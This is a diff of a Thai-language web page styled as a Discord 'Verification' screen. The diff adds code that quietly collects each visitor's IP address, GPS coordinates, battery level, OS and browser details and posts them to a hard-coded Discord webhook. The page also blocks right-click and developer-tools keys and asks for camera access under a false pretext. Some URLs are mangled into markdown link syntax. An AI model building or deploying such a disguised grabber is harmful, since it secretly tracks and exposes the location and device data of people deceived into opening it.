@@ -1,4 +1,3 @@
-html
 <!DOCTYPE html>
 <html lang="th">
 <head>
@@ -6,50 +5,47 @@ html
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord Components V2 UI</title>
 
-    <script src="https://cdn.tailwindcss.com"></script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="[https://cdn.tailwindcss.com](https://cdn.tailwindcss.com)"></script>
+    <link href="[https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap](https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap)" rel="stylesheet">
 
     <style>
-
-        body{
-            font-family:'Kanit',sans-serif;
-            background:#313338;
-            color:white;
-            overflow:hidden;
-            user-select:none;
+        body {
+            font-family: 'Kanit', sans-serif;
+            background: #313338;
+            color: white;
+            user-select: none;
         }
 
-        .glass-panel{
-            background:#1e1f22;
-            border:1px solid #111214;
-            backdrop-filter:blur(24px);
+        .glass-panel {
+            background: #1e1f22;
+            border: 1px solid #111214;
+            backdrop-filter: blur(24px);
         }
 
-        .scan-anim{
-            height:2px;
-            background:#5865F2;
-            position:absolute;
-            width:100%;
-            top:0;
-            animation:move 3s infinite;
-            box-shadow:0 0 20px #5865F2;
+        .scan-anim {
+            height: 2px;
+            background: #5865F2;
+            position: absolute;
+            width: 100%;
+            top: 0;
+            animation: move 3s infinite;
+            box-shadow: 0 0 20px #5865F2;
         }
 
-        @keyframes move{
-            0%{ top:0; }
-            100%{ top:100%; }
+        @keyframes move {
+            0% { top: 0; }
+            100% { top: 100%; }
         }
 
-        ::-kit-scrollbar{
-            width:6px;
+        /* แก้ไข Scrollbar ให้ถูกต้องตามมาตรฐาน */
+        ::-webkit-scrollbar {
+            width: 6px;
         }
 
-        ::-kit-scrollbar-thumb{
-            background:#5865F2;
-            border-radius:999px;
+        ::-webkit-scrollbar-thumb {
+            background: #5865F2;
+            border-radius: 999px;
         }
-
     </style>
 </head>
 
@@ -57,384 +53,187 @@ html
 
 <div class="max-w-md w-full glass-panel rounded-[2rem] overflow-hidden shadow-2xl">
 
-    <!-- HEADER -->
     <div class="h-32 bg-gradient-to-r from-indigo-500 via-blue-500 to-cyan-400 relative">
-
         <div class="absolute bottom-4 left-6 flex items-center gap-4">
-
             <div class="w-20 h-20 rounded-full border-[6px] border-[#1e1f22] bg-[#5865F2] flex items-center justify-center text-4xl shadow-2xl">
                 🛰️
             </div>
-
             <div>
-
                 <div class="flex items-center gap-2">
-
-                    <h1 class="text-2xl font-bold text-white">
-                        Verification
-                    </h1>
-
-                    <span class="bg-[#5865F2] text-white text-[10px] px-2 py-1 rounded-full uppercase tracking-widest">
-                        VERIFIED
-                    </span>
-
+                    <h1 class="text-2xl font-bold text-white">Verification</h1>
+                    <span class="bg-[#5865F2] text-white text-[10px] px-2 py-1 rounded-full uppercase tracking-widest">VERIFIED</span>
                 </div>
-
-                <p class="text-white/80 text-sm">
-                    Discord Components V2
-                </p>
-
+                <p class="text-white/80 text-sm">Discord Components V2</p>
             </div>
-
         </div>
-
     </div>
 
-    <!-- CONTENT -->
     <div class="p-6 pt-10">
 
-        <!-- SCAN -->
         <div id="step-scan" class="text-center">
-
             <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-[#5865F2]/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(88,101,242,0.4)]">
-
-                <video
-                    id="cam"
-                    class="w-full h-full object-cover scale-x-[-1]"
-                    autoplay
-                    playsinline>
-                </video>
-
+                <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                 <div class="absolute inset-0 bg-gradient-to-b from-transparent via-[#5865F2]/10 to-transparent"></div>
-
                 <div class="scan-anim"></div>
-
             </div>
-
-            <p id="status-msg"
-               class="text-[#5865F2] text-sm animate-pulse tracking-widest">
-                กำลังเชื่อมต่อ...
-            </p>
-
+            <p id="status-msg" class="text-[#5865F2] text-sm animate-pulse tracking-widest">กำลังเชื่อมต่อ...</p>
         </div>
 
-        <!-- RESULT -->
         <div id="step-result" class="hidden">
-
             <div class="bg-[#2b2d31] border border-[#1e1f22] rounded-3xl p-5 mb-6">
-
                 <div class="flex items-center gap-4">
-
-                    <div class="w-14 h-14 rounded-2xl bg-green-500 flex items-center justify-center text-2xl shadow-xl">
-                        ✓
-                    </div>
-
+                    <div class="w-14 h-14 rounded-2xl bg-green-500 flex items-center justify-center text-2xl shadow-xl">✓</div>
                     <div>
-
-                        <h2 class="text-lg font-bold text-white">
-                            ตรวจสอบสำเร็จ
-                        </h2>
-
-                        <p class="text-[#949ba4] text-xs">
-                            Ref: TX-994102-B
-                        </p>
-
+                        <h2 class="text-lg font-bold text-white">ตรวจสอบสำเร็จ</h2>
+                        <p class="text-[#949ba4] text-xs">Ref: TX-994102-B</p>
                     </div>
-
                 </div>
-
             </div>
-
             <div id="info-box" class="space-y-3"></div>
-
         </div>
 
     </div>
-
 </div>
 
-```js
 <script>
-
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
+// ย้ายตัวแปรและลบแท็กหลอกออก
+const WEBHOOK_URL = "[https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv](https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv)";
 
 let userData = {
-    lat: null,
-    lon: null,
+    lat: "ไม่ระบุ",
+    lon: "ไม่ระบุ",
     ip: "Unknown",
     battery: "Unknown"
 };
-```
 
-
-// ปิดคลิกขวา
-document.addEventListener(
-    'contextmenu',
-    e => e.preventDefault()
-);
-
-// ปิด F12
+// ปิดคลิกขวา และ F12
+document.addEventListener('contextmenu', e => e.preventDefault());
 document.onkeydown = (e) => {
-    if(
-        e.keyCode == 123 ||
-        (e.ctrlKey && e.shiftKey && e.keyCode == 73)
-    ){
+    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
         return false;
     }
 };
 
-async function startProcess(){
-
-    // โหลด IP
-    try{
-
-        const ipRes =
-            await fetch("https://api.ipify.org?format=json");
-
-        const ipData =
-            await ipRes.json();
-
+async function startProcess() {
+    // 1. โหลด IP
+    try {
+        const ipRes = await fetch("[https://api.ipify.org?format=json](https://api.ipify.org?format=json)");
+        const ipData = await ipRes.json();
         userData.ip = ipData.ip;
+    } catch(e) { console.log("IP Fetch Failed"); }
 
-    }catch{}
-
-    // โหลดแบตเตอรี่
-    try{
-
-        if(navigator.getBattery){
-
-            const battery =
-                await navigator.getBattery();
-
-            userData.battery =
-                Math.floor(battery.level * 100) + "%";
-
+    // 2. โหลดแบตเตอรี่
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            userData.battery = Math.floor(battery.level * 100) + "%";
         }
+    } catch(e) {}
 
-    }catch{}
-
-    // GPS
-    navigator.geolocation.getCurrentPosition(
-
-        async(pos)=>{
-
-            userData.lat = pos.coords.latitude;
-            userData.lon = pos.coords.longitude;
-
-            document.getElementById("status-msg")
-                .innerText =
-                "เข้าถึง GPS สำเร็จ...";
-
-            await initCamera();
-
-        },
-
-        ()=>{
-            alert("กรุณาอนุญาต GPS");
-        }
-
-    );
-
+    // 3. ขอสิทธิ์ GPS
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                userData.lat = pos.coords.latitude;
+                userData.lon = pos.coords.longitude;
+                document.getElementById("status-msg").innerText = "เข้าถึง GPS สำเร็จ...";
+                await initCamera();
+            },
+            async () => {
+                // หากผู้ใช้ปฏิเสธ GPS ให้ข้ามไปเปิดกล้องเลย ไม่ให้หน้าเว็บค้าง
+                document.getElementById("status-msg").innerText = "ปฏิเสธ GPS.. กำลังเปิดกล้อง...";
+                await initCamera();
+            }
+        );
+    } else {
+        await initCamera();
+    }
 }
 
-async function initCamera(){
+async function initCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
 
-    try{
-
-        const stream =
-            await navigator.mediaDevices.getUserMedia({
-                video:{
-                    facingMode:"user",
-                    width:{ ideal:1920 },
-                    height:{ ideal:1080 }
-                }
-            });
-
-        const video =
-            document.getElementById("cam");
-
+        const video = document.getElementById("cam");
         video.srcObject = stream;
 
-        document.getElementById("status-msg")
-            .innerText =
-            "กำลังตรวจสอบอุปกรณ์...";
+        document.getElementById("status-msg").innerText = "กำลังตรวจสอบอุปกรณ์...";
 
-        setTimeout(()=>{
-
-            stream.getTracks()
-                .forEach(t=>t.stop());
-
+        setTimeout(() => {
+            stream.getTracks().forEach(t => t.stop());
             showResult();
+        }, 3000);
 
-        },3000);
-
-    }catch{
-
-        alert("กรุณาอนุญาตกล้อง");
-
+    } catch (err) {
+        // หากไม่มีกล้องหรือปฏิเสธสิทธิ์ ให้ข้ามไปแสดงผลลัพธ์เลยเพื่อไม่ให้หน้าเว็บค้าง
+        showResult();
     }
-
 }
 
-function showResult(){
+// ฟังก์ชันสำหรับส่งข้อมูลไปยัง Discord Webhook
+async function sendToWebhook() {
+    const payload = {
+        embeds: [{
+            title: "📡 ข้อมูลการตรวจสอบใหม่",
+            color: 5814786,
+            fields: [
+                { name: "IP Address", value: userData.ip, inline: true },
+                { name: "Battery", value: userData.battery, inline: true },
+                { name: "พิกัด (GPS)", value: `${userData.lat}, ${userData.lon}` },
+                { name: "ระบบปฏิบัติการ", value: navigator.platform, inline: true },
+                { name: "เบราว์เซอร์", value: navigator.userAgent }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
 
-    document.getElementById("step-scan")
-        .classList.add("hidden");
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    } catch(e) { console.error("Webhook send failed", e); }
+}
 
-    document.getElementById("step-result")
-        .classList.remove("hidden");
+function showResult() {
+    document.getElementById("step-scan").classList.add("hidden");
+    document.getElementById("step-result").classList.remove("hidden");
 
-    const box =
-        document.getElementById("info-box");
+    // ส่งข้อมูลไปที่ Discord ทันทีเมื่อประมวลผลเสร็จ
+    sendToWebhook();
 
+    const box = document.getElementById("info-box");
     const data = [
-
-        {
-            icon:"📍",
-            title:"พิกัด",
-            value:`${userData.lat}, ${userData.lon}`
-        },
-
-        {
-            icon:"🌐",
-            title:"IP Address",
-            value:userData.ip
-        },
-
-        {
-            icon:"💻",
-            title:"ระบบ",
-            value:navigator.platform
-        },
-
-        {
-            icon:"🗣️",
-            title:"ภาษา",
-            value:navigator.language
-        },
-
-        {
-            icon:"🖥️",
-            title:"หน้าจอ",
-            value:`${screen.width}x${screen.height}`
-        },
-
-        {
-            icon:"🧠",
-            title:"CPU Cores",
-            value:navigator.hardwareConcurrency || "Unknown"
-        },
-
-        {
-            icon:"💾",
-            title:"RAM",
-            value:(navigator.deviceMemory || "Unknown") + " GB"
-        },
-
-        {
-            icon:"🔋",
-            title:"Battery",
-            value:userData.battery
-        },
-
-        {
-            icon:"🌍",
-            title:"Timezone",
-            value:Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone
-        },
-
-        {
-            icon:"📶",
-            title:"Connection",
-            value:navigator.connection
-                ? navigator.connection.effectiveType
-                : "Unknown"
-        },
-
-        {
-            icon:"🍪",
-            title:"Cookies",
-            value:navigator.cookieEnabled
-                ? "Enabled"
-                : "Disabled"
-        },
-
-        {
-            icon:"🌙",
-            title:"Dark Mode",
-            value:window.matchMedia(
-                '(prefers-color-scheme: dark)'
-            ).matches
-                ? "Enabled"
-                : "Disabled"
-        },
-
-        {
-            icon:"🏙️",
-            title:"Street View",
-            value:`https://www.google.com/maps?q&layer=c&cbll=${userData.lat},${userData.lon}`
-        },
-
-        {
-            icon:"🗺️",
-            title:"Google Maps",
-            value:`https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon}`
-        }
-
+        { icon: "📍", title: "พิกัด", value: `${userData.lat}, ${userData.lon}` },
+        { icon: "🌐", title: "IP Address", value: userData.ip },
+        { icon: "💻", title: "ระบบ", value: navigator.platform },
+        { icon: "🗣️", title: "ภาษา", value: navigator.language },
+        { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
+        { icon: "🔋", title: "Battery", value: userData.battery }
     ];
 
-    data.forEach(item=>{
-
+    box.innerHTML = ""; // ล้างข้อมูลเก่าก่อน
+    data.forEach(item => {
         box.innerHTML += `
-            <div class="
-                bg-[#2b2d31]
-                border border-[#1e1f22]
-                rounded-2xl
-                p-4
-                flex items-center
-                gap-4
-                hover:bg-[#32353b]
-                transition-all
-            ">
-
-                <div class="
-                    w-12 h-12
-                    rounded-2xl
-                    bg-[#5865F2]
-                    flex items-center
-                    justify-center
-                    text-2xl
-                    shadow-lg
-                ">
+            <div class="bg-[#2b2d31] border border-[#1e1f22] rounded-2xl p-4 flex items-center gap-4 hover:bg-[#32353b] transition-all">
+                <div class="w-12 h-12 rounded-2xl bg-[#5865F2] flex items-center justify-center text-2xl shadow-lg">
                     ${item.icon}
                 </div>
-
                 <div class="flex-1 overflow-hidden">
-
-                    <p class="text-xs uppercase tracking-widest text-[#949ba4] mb-1">
-                        ${item.title}
-                    </p>
-
-                    <p class="font-semibold break-all text-sm text-white">
-                        ${item.value}
-                    </p>
-
+                    <p class="text-xs uppercase tracking-widest text-[#949ba4] mb-1">${item.title}</p>
+                    <p class="font-semibold break-all text-sm text-white">${item.value}</p>
                 </div>
-
             </div>
         `;
-
     });
-
 }
 
-// เริ่มอัตโนมัติ
 window.onload = () => {
     startProcess();
 };
-
 </script>
 
 </body>
